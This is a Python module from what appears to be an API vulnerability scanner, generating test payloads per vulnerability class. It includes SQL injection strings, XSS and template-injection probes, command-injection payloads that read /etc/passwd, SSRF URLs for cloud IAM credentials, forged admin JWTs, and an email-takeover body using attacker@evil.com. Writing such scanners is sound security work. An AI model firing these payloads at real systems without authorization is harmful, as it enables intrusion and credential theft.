"""Context-aware payload construction per vulnerability class."""


from dataclasses import dataclass
from typing import Any


@dataclass
class TestPayload:
    """A single generated test case."""

    name: str
    description: str
    payload: Any
    expected_indicators: list[str]
    vulnerability_class: str
    inject_location: str = "body"  # "body", "path", "query", "header"


class PayloadEngine:

    # ------------------------------------------------------------------
    # BOLA / IDOR — object-level authorization
    # ------------------------------------------------------------------

    def bola_id_variants(self, base_id: Any) -> list[TestPayload]:
        """
        Generate a spread of IDs around a known base ID to probe whether the
        server enforces object-level ownership. Numeric IDs are incremented and
        decremented; we also probe known admin-adjacent values.
        """
        variants: list[TestPayload] = []

        if isinstance(base_id, (int, float)) or (
            isinstance(base_id, str) and str(base_id).lstrip("-").isdigit()
        ):
            n = int(base_id)
            for offset in (-5, -2, -1, 1, 2, 5, 100, 9999):
                test_id = max(1, n + offset)
                variants.append(
                    TestPayload(
                        name=f"BOLA numeric offset {offset:+d}",
                        description=f"Access resource ID {test_id} (base={n})",
                        payload=test_id,
                        expected_indicators=["200"],
                        vulnerability_class="BOLA",
                        inject_location="path",
                    )
                )

        for reserved_id in [1, 2, 0, -1]:
            variants.append(
                TestPayload(
                    name=f"BOLA reserved ID {reserved_id}",
                    description=f"Access reserved/admin ID {reserved_id}",
                    payload=reserved_id,
                    expected_indicators=["200"],
                    vulnerability_class="BOLA",
                    inject_location="path",
                )
            )

        variants.append(
            TestPayload(
                name="BOLA nil UUID",
                description="Access nil UUID (common admin or system resource)",
                payload="00000000-0000-0000-0000-000000000001",
                expected_indicators=["200"],
                vulnerability_class="BOLA",
                inject_location="path",
            )
        )

        return variants

    # ------------------------------------------------------------------
    # Injection — SQLi, XSS reflected, command injection
    # ------------------------------------------------------------------

    def sql_injection_payloads(self) -> list[TestPayload]:
        cases = [
            ("Classic OR bypass", "' OR '1'='1", ["sql", "syntax", "error", "ORA-", "mysql", "sqlite", "postgresql", "ODBC"]),
            ("Comment bypass", "' OR 1=1--", ["sql", "syntax", "200"]),
            ("UNION probe", "' UNION SELECT NULL,NULL--", ["UNION", "column", "error", "syntax"]),
            ("Error-based MSSQL", "'; SELECT @@version--", ["Microsoft", "SQL Server", "error"]),
            ("Error-based MySQL", "' AND extractvalue(1,concat(0x7e,(SELECT version())))--", ["XPATH", "error"]),
            ("Boolean blind true", "' AND 1=1--", ["200"]),
            ("Boolean blind false", "' AND 1=2--", ["404", "empty", "null", "no results"]),
            ("Time-based blind MySQL", "' AND SLEEP(5)--", ["slow", "timeout"]),
            ("Time-based blind MSSQL", "'; WAITFOR DELAY '0:0:5'--", ["slow", "timeout"]),
            ("Stacked queries probe", "'; SELECT 1--", ["error", "500"]),
        ]
        return [
            TestPayload(
                name=f"SQLi: {name}",
                description=f"SQL injection probe — payload: {p!r}",
                payload=p,
                expected_indicators=list(indicators),
                vulnerability_class="SQLi",
                inject_location="query",
            )
            for name, p, indicators in cases
        ]

    def xss_payloads(self) -> list[TestPayload]:
        cases = [
            ("<script>alert(1)</script>", "Bare script tag"),
            ("<img src=x onerror=alert(1)>", "Image onerror handler"),
            ("'\"><script>alert(1)</script>", "Attribute breakout"),
            ("<svg onload=alert(1)>", "SVG event handler"),
            ("javascript:alert(document.domain)", "JavaScript protocol URI"),
            ("${7*7}", "Server-side template injection probe"),
            ("{{7*7}}", "Jinja/Twig template injection probe"),
            ("<iframe src=javascript:alert(1)>", "iframe src injection"),
        ]
        return [
            TestPayload(
                name=f"XSS: {desc}",
                description="Test whether payload survives into the response body unescaped",
                payload=p,
                expected_indicators=[
                    "<script>", "onerror=", "onload=", "javascript:", "${7*7}", "49", "{{7*7}}",
                ],
                vulnerability_class="XSS",
                inject_location="query",
            )
            for p, desc in cases
        ]

    def command_injection_payloads(self) -> list[TestPayload]:
        cases = [
            ("; id", "Unix command separator — id"),
            ("| id", "Unix pipe — id"),
            ("`id`", "Unix backtick subshell"),
            ("$(id)", "Unix $() subshell"),
            ("; cat /etc/passwd", "Read /etc/passwd"),
            ("; sleep 5", "Time-based blind (sleep 5)"),
            ("& whoami &", "Windows command separator"),
            ("|whoami", "Windows pipe — whoami"),
            ("|| dir", "Windows OR-chained dir"),
        ]
        return [
            TestPayload(
                name=f"CMDi: {desc}",
                description=f"OS command injection probe — payload: {p!r}",
                payload=p,
                expected_indicators=[
                    "root:", "uid=", "www-data", "nobody", "Administrator",
                    "Volume in drive", "Directory of", "passwd",
                ],
                vulnerability_class="CommandInjection",
                inject_location="query",
            )
            for p, desc in cases
        ]

    # ------------------------------------------------------------------
    # SSRF
    # ------------------------------------------------------------------

    def ssrf_payloads(self) -> list[TestPayload]:
        cases = [
            ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds via IMDS"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata endpoint"),
            ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
            ("http://127.0.0.1:22", "Internal SSH port probe"),
            ("http://127.0.0.1:6379", "Redis internal probe"),
            ("http://127.0.0.1:5432", "PostgreSQL internal probe"),
            ("http://127.0.0.1:3306", "MySQL internal probe"),
            ("http://0.0.0.0:8080", "Bind-all internal service"),
            ("http://[::1]:8080", "IPv6 loopback probe"),
            ("file:///etc/passwd", "Local file read via file://"),
            ("dict://127.0.0.1:11211/", "Memcached via dict://"),
        ]
        return [
            TestPayload(
                name=f"SSRF: {desc}",
                description=f"SSRF probe targeting internal resource: {url}",
                payload=url,
                expected_indicators=[
                    "ami-id", "instance-id", "computeMetadata", "root:", "SSH-",
                    "redis_version", "PostgreSQL", "mysql", "STORED",
                ],
                vulnerability_class="SSRF",
                inject_location="body",
            )
            for url, desc in cases
        ]

    # ------------------------------------------------------------------
    # Mass assignment / BOPLA
    # ------------------------------------------------------------------

    def mass_assignment_payloads(self) -> list[TestPayload]:
        return [
            TestPayload(
                name="Role escalation via body",
                description="Inject privileged role fields into a create/update request",
                payload={"role": "admin", "is_admin": True, "isAdmin": True, "admin": True},
                expected_indicators=["admin", "role", "200"],
                vulnerability_class="MassAssignment",
                inject_location="body",
            ),
            TestPayload(
                name="Financial field injection",
                description="Inject balance/credit fields to modify account values",
                payload={"balance": 999999, "credit": 999999, "wallet_balance": 999999, "points": 999999},
                expected_indicators=["balance", "credit", "200", "999999"],
                vulnerability_class="MassAssignment",
                inject_location="body",
            ),
            TestPayload(
                name="Email override / account takeover",
                description="Override email address to redirect sensitive communications",
                payload={"email": "attacker@evil.com", "confirmed_email": "attacker@evil.com", "verified_email": "attacker@evil.com"},
                expected_indicators=["attacker@evil.com", "200"],
                vulnerability_class="MassAssignment",
                inject_location="body",
            ),
            TestPayload(
                name="Owner ID override",
                description="Override ownership fields to reassign resource ownership",
                payload={"user_id": 1, "owner_id": 1, "created_by": 1, "account_id": 1},
                expected_indicators=["200", "user_id", "owner"],
                vulnerability_class="MassAssignment",
                inject_location="body",
            ),
            TestPayload(
                name="Verification status bypass",
                description="Force account verification or approval flags",
                payload={"verified": True, "email_verified": True, "kyc_verified": True, "approved": True},
                expected_indicators=["verified", "approved", "200"],
                vulnerability_class="MassAssignment",
                inject_location="body",
            ),
        ]

    # ------------------------------------------------------------------
    # Authentication bypass
    # ------------------------------------------------------------------

    def auth_bypass_payloads(self) -> list[TestPayload]:
        return [
            TestPayload(
                name="No Authorization header",
                description="Request issued with no Authorization header at all",
                payload=None,
                expected_indicators=["200", "data", "user", "profile", "result"],
                vulnerability_class="BrokenAuth",
                inject_location="header",
            ),
            TestPayload(
                name="Empty Bearer token",
                description="Authorization: Bearer <empty>",
                payload={"Authorization": "Bearer "},
                expected_indicators=["200"],
                vulnerability_class="BrokenAuth",
                inject_location="header",
            ),
            TestPayload(
                name="Null string token",
                description="Authorization: Bearer null",
                payload={"Authorization": "Bearer null"},
                expected_indicators=["200"],
                vulnerability_class="BrokenAuth",
                inject_location="header",
            ),
            TestPayload(
                name="Algorithm=none JWT",
                description=(
                    "JWT with alg:none — signed with no signature to test if server "
                    "validates the algorithm field before verifying the signature"
                ),
                payload={
                    "Authorization": (
                        "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
                        ".eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ."
                    )
                },
                expected_indicators=["200", "admin"],
                vulnerability_class="BrokenAuth",
                inject_location="header",
            ),
            TestPayload(
                name="HS256 weak secret JWT",
                description="JWT signed with the weak secret 'secret' — tests for hardcoded signing keys",
                payload={
                    "Authorization": (
                        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
                        ".eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0"
                        ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
                    )
                },
                expected_indicators=["200", "admin"],
                vulnerability_class="BrokenAuth",
                inject_location="header",
            ),
        ]

    # ------------------------------------------------------------------
    # Shadow / undocumented endpoint discovery
    # ------------------------------------------------------------------

    def shadow_endpoint_paths(self) -> list[str]:
        """
        Common paths for undocumented, legacy, debug, and admin endpoints.
        Grouped by category for readability.
        """
        return [
            # Admin panels
            "/admin", "/admin/", "/admin/users", "/admin/config",
            "/api/admin", "/api/v1/admin", "/api/v2/admin",
            # Internal/debug
            "/api/internal", "/api/debug", "/debug", "/test",
            "/api/test", "/dev", "/api/dev",
            # Spring Boot Actuator
            "/actuator", "/actuator/env", "/actuator/health",
            "/actuator/beans", "/actuator/mappings", "/actuator/loggers",
            "/actuator/httptrace", "/actuator/dump",
            # Metrics / health
            "/health", "/healthz", "/ready", "/metrics",
            "/api/health", "/api/v1/health",
            # Docs / spec exposure
            "/swagger", "/swagger-ui.html", "/swagger-ui/index.html",
            "/api-docs", "/v2/api-docs", "/v3/api-docs",
            "/openapi.json", "/openapi.yaml",
            "/docs", "/redoc",
            # GraphQL
            "/graphql", "/graphiql", "/api/graphql",
            # Config / secrets exposure
            "/.env", "/config", "/api/config",
            "/application.properties", "/application.yaml",
            # Version probing
            "/api/v0/users", "/api/v1/users", "/api/v2/users",
            "/api/v3/users", "/v1/users", "/v2/users",
            # Backup / export
            "/backup", "/api/backup", "/api/v1/export",
            "/api/export", "/dump", "/api/dump",
            # Common sensitive endpoints
            "/api/v1/users/all", "/api/v1/users/list",
            "/api/v1/internal/users", "/api/v1/admin/users",
            "/api/v1/tokens", "/api/v1/keys",
        ]

    # ------------------------------------------------------------------
    # Security misconfiguration probes
    # ------------------------------------------------------------------

    def cors_origins_to_probe(self) -> list[str]:
        return [
            "https://evil.com",
            "https://attacker.example.com",
            "null",
            "https://trusted.com.evil.com",
        ]

    def sensitive_headers_expected(self) -> list[str]:
        return [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "X-XSS-Protection",
            "Referrer-Policy",
        ]
